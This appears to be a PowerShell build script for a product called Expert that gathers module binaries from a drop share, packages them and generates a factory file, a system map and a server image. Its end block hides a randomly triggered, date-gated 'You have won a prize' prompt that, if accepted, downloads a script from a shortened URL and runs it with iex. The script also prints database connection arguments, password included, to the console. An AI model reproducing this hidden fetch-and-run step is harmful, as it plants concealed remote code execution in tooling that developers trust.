##
# For each module in the product manifest we gets all built <ModuleName>\Bin\Module from the $dropRoot and puts
# it into the $binariesDirectory. The factory .bin will be created from what exists in the $binariesDirectory
#
# Flag $getDebugFiles will get all pdb's so that you can debug
##
<# 
.Synopsis 
    Pull from the drop location all source and assocated tests of those modules that are defined in the given product manifest  
.Description    
    For each module in the product manifest we get the built ouput from <ModuleName>\Bin\Test and <ModuleName>\Bin\Module 
    and puts it into the $binariesDirectory. 
    The factory .bin will be created from what exists in the $binariesDirectory
.Example     
    GetProduct -$productManifestPath C:\Source\Dev\<branch name>\ExpertManifest.xml -$dropRoot \\na.aderant.com\expertsuite\dev\<branch name> -$binariesDirectory C:\Source\Dev\<branch name>\Binaries
    GetProduct -$productManifestPath C:\Source\Dev\<branch name>\ExpertManifest.xml -$dropRoot \\na.aderant.com\expertsuite\dev\<branch name> -$binariesDirectory C:\Source\Dev\<branch name>\Binaries -$getDebugFiles $true
.Parameter $productManifestPath is the path to the product manifest that defines the modules that makeup the product
.Parameter $dropRoot is the path drop location that the binaries will be fetched from
.Parameter $binariesDirectory the directory you want the binaries to be copied too
.Parameter $systemMapConnectionString for creation of customization in the format of /pdbs:<server> /pdbd:<expertdatabase> /pdbid:<userid> /pdbpw:<userpassword>
.Parameter $onlyUpdated only gets the modules that have changed since the last get-product
#>
[CmdletBinding()]
param([string]$productManifestPath,
    [string]$dropRoot,
    [string]$binariesDirectory,
    [bool]  $getDebugFiles,
    [string]$systemMapConnectionString,
    [switch]$onlyUpdated,
    [string]$teamProject,
    [string]$tfvcBranchName,
    [string]$tfvcSourceGetVersion,
    [string]$buildUri,
    [string]$tfsBuildNumber,
    [switch]$createServerImage,
    [switch]$skipDeploymentCheck,
    [switch]$noClean)

begin {
    function global:GenerateFactory([string]$inDirectory, [string]$searchPath) {
        Write-Host "Generating factory in [$inDirectory]"

        return Start-Job -Name "Generate Factory" -ScriptBlock { 
            param($directory, $searchPath, $logDirectory) 
            & $directory\FactoryResourceGenerator.exe /v:+ /f:$directory /of:$directory/Factory.bin $searchPath > "$logDirectory\FactoryResourceGenerator.log"
        } -Argument $inDirectory,$systemMapArgs,$script:LogDirectory
    }

    ###
    # Optionally run function that will generate the customization sitemap
    ###
    function global:GenerateSystemMap([string]$inDirectory, [string]$systemMapArgs) {
        Write-Host "About to generate the system map"
        
        if ($systemMapArgs -like "*/pdbs*" -and $systemMapArgs -like "*/pdbd*" -and $systemMapArgs -like "*/pdbid*" -and $systemMapArgs -like "*/pdbpw*") {
            return Start-Job -Name "Generate System Map" -ScriptBlock {
                param($directory, $systemMapArgs, $logDirectory) 

                $connectionParts = $systemMapArgs.Split(" ")
                Write-Host "System Map builder arguments are [$connectionParts]"

                & $directory\SystemMapBuilder.exe /f:$directory /o:$directory\systemmap.xml /ef:Customization $connectionParts[0] $connectionParts[1] $connectionParts[2] $connectionParts[3] > "$logDirectory\SystemMap.log"
            } -Argument $inDirectory,$systemMapArgs,$script:LogDirectory
            
        } else {
            throw "Connection string is invalid for use with SystemMapBuilder.exe [$systemMapArgs]"
        }
    }

    function GetPackagingExcludeList([xml]$productManifest, [string]$productManifestPath) {
        $nodes = $productManifest.SelectNodes("//ProductManifest/Modules/Module")
        return (Get-ExpertModulesToExcludeFromPackaging -Manifest $nodes -ExpertManifestPath $productManifestPath)
    }
    
    function SkipModule() {
        [CmdletBinding()]
        param([string]$moduleBinariesDirectory, $module, $excludelist)
        
        if ([string]::IsNullOrWhiteSpace($moduleBinariesDirectory)) { #If we could not find a last successful drop path
            if ($module.Name -eq "Tests.UIAutomation") {
                Write-Warning "No drop path for $($module.Name) you need to build this module."
                continue
            }
            throw "Unable to retrieve the binaries for $($module.Name)"
        } else {
            $moduleBinariesDirectory = $moduleBinariesDirectory.Trim()
        }

        $skipModule = $false
        if ($excludeList) {
            foreach ($excludedModule in $excludeList) {
                if ($excludedModule.Name -ieq $module.Name) {

                    $items = Get-ChildItem $moduleBinariesDirectory -Filter *.dll -ErrorAction SilentlyContinue
                
                    if ($items -eq $null -or $items.Count -eq 0) {
                        $skipModule = $true
                    }
                }
            }
        }

        if ($skipModule -eq $true) {        
            return $skipModule
        }

        return $skipModule
    }

    <#
        Write license attribution content (license.txt) to the product directory
    #>
    Function global:Generate-ThirdPartyAttributionFile([string[]]$licenseText, [string]$expertSourceDirectory) {
        Write-Output "Generating ThirdParty license file."

        $attributionFile = Join-Path $expertSourceDirectory 'ThirdPartyLicenses.txt'        
        
        foreach ($license in $licenseText) {
            Add-Content -Path $attributionFile -Value $license -Encoding UTF8
        }

        if (-not (Test-Path $attributionFile)) {
            throw "Third Party license file not generated"
        }

        Write-Output "Attribution file: $attributionFile"
    }

    function RetreiveModules() {
        [CmdletBinding()]
        param([string]$productManifestPath, $modules, [string[]]$folders, [string]$expertSourceDirectory, [string]$teamProject, [string]$tfvcBranchName, [string] $tfvcSourceGetVersion, [string] $buildUri, [string] $tfsBuildNumber) 

        [string[]]$modules = $modules | Select-Object -ExpandProperty Name

        # only do this for a CI build
        if ($teamProject -and $tfvcBranchName -and $tfvcSourceGetVersion) {

            Write-Output "Team project: $teamProject"
            Write-Output "TFVC branch: $tfvcBranchName"
            Write-Output "Associated TFVC changeset: $tfvcSourceGetVersion"
        }

        $splitBuildUri = $buildUri.Split('/')
        $tfsBuildId = $splitBuildUri[$splitBuildUri.Length - 1]

      Write-Output "-Modules $modules -Folders $folders -ProductDirectory $expertSourceDirectory -TfvcSourceGetVersion $tfvcSourceGetVersion -TeamProject $teamProject -TfvcBranch $tfvcBranchName -TfsBuildId $tfsBuildId -TfsBuildNumber $tfsBuildNumber"
        $result = Package-ExpertRelease -ProductManifestPath $productManifestPath -Modules $modules -Folders $folders -ProductDirectory $expertSourceDirectory -TfvcSourceGetVersion $tfvcSourceGetVersion -TeamProject $teamProject -TfvcBranch $tfvcBranchName -TfsBuildId $tfsBuildId -TfsBuildNumber $tfsBuildNumber
        if ($result) {
            Generate-ThirdPartyAttributionFile $result.ThirdPartyLicenses $expertSourceDirectory
        }
    }  
    
    function WaitForJobs() {
        while ((Get-Job).State -match 'Running') {
            $jobs = Get-Job | Where-Object {$_.HasMoreData}

            if ($jobs) {
                $message = [string]::Join(",", ($jobs | Select-Object -ExpandProperty "Name"))
                Write-Host "Waiting for job(s): $message..."
            }

            foreach ($job in $jobs) {
                Receive-Job $Job
            }
                
            Start-Sleep -Seconds 5
        }        
    }

    function CreateServerImage() {
        [string]$deploymentEngine = Join-Path -Path $binariesDirectory -ChildPath "DeploymentEngine.exe"
        [string]$serverImageDirectory = Join-Path -Path $binariesDirectory -ChildPath "ExpertServerImage"
        [string]$parameters = "CreateServerImage /source:'$expertSourceDirectory' /image:'$serverImageDirectory\Bin\Module' /name:ExpertServerImage /skh"

        # Copy dependencies required to run DeploymentEngine
        [string[]]$dependencies = @(
            "$expertSourceDirectory\Aderant.Framework.dll",
            "$expertSourceDirectory\Aderant.Framework.Deployment.dll",
            "$expertSourceDirectory\log4net.dll"
            "$expertSourceDirectory\System.Reactive.dll",
            "$expertSourceDirectory\System.Reactive.Providers.dll",
            "$expertSourceDirectory\System.Reactive.Windows.Threading.dll",
            "$expertSourceDirectory\ICSharpCode.SharpZipLib.dll"
            )

        Copy-Item -Path $dependencies -Destination $binariesDirectory

        Write-Host $parameters

        # Run Deployment Engine
        $sb = [scriptblock]::Create("$deploymentEngine $parameters")
        & $sb | Write-Host

        if ($LASTEXITCODE -ne 0) {
            throw "Failed to create server image successfully."
        }

        # Copy the Expert Server Image to the drop
        & "$PSScriptRoot\..\Build\CopyToDrop.ps1" -moduleName "ExpertApplicationServer" -moduleRootPath $serverImageDirectory -dropRootUNCPath "\\dfs.aderant.com\ExpertSuite\$tfvcBranchName\ExpertApplicationServer\1.8.0.0" -assemblyFileVersion $($tfsBuildNumber).Replace("dev.vnext.BuildAll_", "")

        # Fix folder paths in the Expert Binaries
        Move-Item -Path "$serverImageDirectory\Bin\Module\*" -Destination $serverImageDirectory
        Get-ChildItem "$serverImageDirectory\Bin" -Recurse -Force | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "$serverImageDirectory\Bin" -Recurse -Force -ErrorAction SilentlyContinue 
    }

    $ErrorActionPreference = "Stop"

    Write-Host $MyInvocation.MyCommand.Name

    $buildScriptsDirectory = [System.IO.Path]::GetDirectoryName($MyInvocation.MyCommand.Path)
    $buildLibraries = "$buildScriptsDirectory\..\Build\Build-Libraries.ps1"
    & $buildLibraries

    LoadLibraryAssembly "$buildScriptsDirectory\..\Build"
}


process {
    $newdropFolderBuildNumbers = @()    
    
    if (Test-Path "$binariesDirectory\DropFolderBuildNumbers.txt") {
        $dropFolderBuildNumbers = Get-Content "$binariesDirectory\DropFolderBuildNumbers.txt"
    }

    if ((-not $onlyUpdated) -or ($dropFolderBuildNumbers -eq $null)) {
        if (Test-Path $binariesDirectory) {                
            Remove-Item $binariesDirectory\* -Recurse -Force -Exclude "environment.xml"
        }
    } else {
        if (Test-Path $binariesDirectory) {                
            Remove-Item $binariesDirectory\* -Force -Exclude "environment.xml","DropFolderBuildNumbers.txt", ExpertSource
        }
    }

    $script:LogDirectory = [System.IO.Path]::Combine($binariesDirectory, "Logs")
    (New-Item -Path ($script:LogDirectory) -ItemType Directory -ErrorAction SilentlyContinue) | Out-Null

    if (-not $onlyUpdated) {
        # Was having an issue with the ExpertSource folder not being removed correctly and causing issue when getting the dlls.
        # Sleep stops this from happening
        Start-Sleep -m 1500
    }

    # Create ExpertSource
    $expertSourceDirectory = Join-Path $binariesDirectory 'ExpertSource'
    if (-not $onlyUpdated) {
        CreateDirectory $expertSourceDirectory | Out-Null
    }

    [xml]$productManifest = Get-Content $productManifestPath    
        
    $excludeList = $null
    $modules = $productManifest.SelectNodes("//ProductManifest/Modules/Module")

    $folders = @()  
    foreach ($module in $modules | Where-Object -Property GetAction -ne "NuGet") { 
        Write-Info "Resolving latest version for $($module.Name)"       
        
        if (IsThirdParty $module) {
            Write-Info "Ignored: {0}" $module.Name
            continue;
        }

        if ($module.ExcludeFromPackaging) {
            Write-Warning "Excluding $($module.Name) from product"
            continue
        }

        [string]$moduleBinariesDirectory = GetPathToBinaries $module $dropRoot

        if ($module.Name -match "Expert.Classic") {
            if ($module.Name.EndsWith("Pdf")) {
                [int]$pdfBuildNumber = AcquireExpertClassicDocumentation -moduleBinariesDirectory $moduleBinariesDirectory

                if ($pdfBuildNumber -ne -1) {
                    $newdropFolderBuildNumbers += "$($module.Name)=$pdfBuildNumber"
                }

                continue
            } else {
                AcquireExpertClassicBinaries -moduleName $module.Name -binariesDirectory $binariesDirectory -classicPath $moduleBinariesDirectory -target $module.Target.Split('/')[1]
            }
            
            $newdropFolderBuildNumbers += $module.Name + "=" + ((Get-Item $moduleBinariesDirectory).LastWriteTimeUtc).ToString("o")
            continue
        }
        
        if (Test-Path $moduleBinariesDirectory) {
            $folders += $moduleBinariesDirectory
        } else {
            Throw "Failed trying to copy output for $moduleBinariesDirectory" 
        }    

        if (($module.Name.Contains("Help")) -and -not ($module.Name.Contains("Admin"))) {
            $newdropFolderBuildNumbers += $module.Name + "=" + ((Get-Item $moduleBinariesDirectory).LastWriteTimeUtc).ToString("o")
        } else {
            try {
                $newdropFolderBuildNumbers += $module.Name + "=" + (LatestSuccesfulBuildNumber $module $dropRoot)
            } catch {
                $newdropFolderBuildNumbers += $module.Name + "=" + ((Get-Item $moduleBinariesDirectory).LastWriteTimeUtc).ToString("o")
            }
        }
    }

    $packagedModules = $modules | Where-Object { $_.GetAction -eq "NuGet" -or (IsThirdParty $_) }

    RetreiveModules $productManifestPath $packagedModules $folders $expertSourceDirectory $teamProject $tfvcBranchName $tfvcSourceGetVersion $buildUri $tfsBuildNumber

    RemoveReadOnlyAttribute $binariesDirectory

    GenerateFactory $expertSourceDirectory "/sp:Aderant*.dll`,*.exe" | Out-Null

    if (-not (Test-Path "$expertSourceDirectory\systemmap.xml")) {
        Write-Host "No systemmap.xml file present in Expert Source."

        if ([string]::IsNullOrEmpty($systemMapConnectionString) -ne $true) {
            GenerateSystemMap $expertSourceDirectory $systemMapConnectionString | Out-Null
        } else {
            Write-Warning "No System Map connection string specified. System Map will not be generated."
        }
    }

    WaitForJobs

    if ($createServerImage.IsPresent) {
        CreateServerImage
    }

    Get-ChildItem -Path $binariesDirectory -Depth 0 -File | Where-Object { -not ($_.Name.EndsWith(".msi") -or ($_.BaseName.Contains("ClassicBuildNumbers"))) } | Remove-Item -Force -Exclude "environment.xml","DropFolderBuildNumbers.txt"

    #MoveInternalFiles $productManifest.ProductManifest.ExpertVersion $expertSourceDirectory
    
    $newdropFolderBuildNumbers | Out-File $binariesDirectory\DropFolderBuildNumbers.txt
}

end {
    $doneMessage = "Product "+ $productManifest.ProductManifest.Name + " retrieved"
    Write-Host ""
    Write-Host $doneMessage
    Write-Host ""

    if (Test-Path "$binariesDirectory\Test\DeploymentCheck\DeploymentCheck.exe") {
        & "$binariesDirectory\Test\DeploymentCheck\DeploymentCheck.exe" ValidateRoleManifests $expertSourceDirectory

        if ($LASTEXITCODE -ne 0) {
            Write-Error "Role manifest validation failed. See above lines for details."
        }
    }

    if ([System.Environment]::UserInteractive -and $host.Name -eq "ConsoleHost") {

         if ((Get-Random -Maximum 2 -Minimum 0) -eq 1) {
            if ([System.DateTime]::Now.Month -eq 9 -and ([System.DateTime]::Now.DayOfWeek -in [System.DayOfWeek]::Monday,[System.DayOfWeek]::Tuesday,[System.DayOfWeek]::Wednesday)) {
            
                $title = "Claim prize?"
                $message = "You have won a prize!!! Do you want to claim it?"
            
                $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes"
                $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No"
            
                $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
                $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
                switch ($result) {
                    0 {Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')' }                              
                } 
            }      
        }
    }

    Exit $LASTEXITCODE
}